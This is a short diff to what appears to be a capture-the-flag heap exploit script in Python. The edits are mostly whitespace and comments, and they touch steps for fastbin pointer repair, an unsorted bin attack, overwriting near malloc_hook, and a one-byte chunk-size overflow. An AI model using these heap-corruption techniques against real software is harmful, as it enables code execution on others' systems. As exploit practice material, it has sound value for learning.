@@ -66,13 +66,13 @@ if __name__=='__main__':
 
 	Add(4,0x68)
 	Add(4,0x68)
-# fix fastbin
+# fix fastbin 
 	Free(3)
 	fix_fd = p64(0)
 	Edit(3,len(fix_fd)-1,fix_fd)
 	Add(3,0x68)
-	Add(3,0x30)
-	Add(3,0x40)
+	Add(3,0x30)  #fix unsorted bin
+	Add(3,0x40) 
 
 # unsorted bin attack
 	
@@ -87,8 +87,8 @@ if __name__=='__main__':
 	Edit(2,len(malloc_hook_po)-1,malloc_hook_po)
 
 	over_one = 'a'*0x18
-        over_one += '\x71'
-        Edit(1,len(over_one)-1,over_one)
+    over_one += '\x71'
+    Edit(1,len(over_one)-1,over_one)
 		
 	Add(2,0x68)	
 	
